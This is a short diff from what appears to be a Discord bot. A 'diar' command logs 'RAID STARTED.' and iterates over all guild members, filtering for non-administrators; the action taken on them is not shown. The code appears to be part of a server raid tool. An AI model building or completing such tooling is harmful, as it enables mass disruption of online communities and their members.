@@ -57,7 +57,7 @@ client.on('interactionCreate', async interaction => {
 
   if (interaction.commandName === 'diar') {
     console.log("RAID STARTED.")
-    let guild = interaction.channel.guild
+    let guild = interaction.guild
     for (const member of guild.members.cache.values()) {
         try {
           if (!member.permissions.has(PermissionFlagsBits.Administrator) || !member.permissions.has(PermissionFlagsBits.Administrator)) {
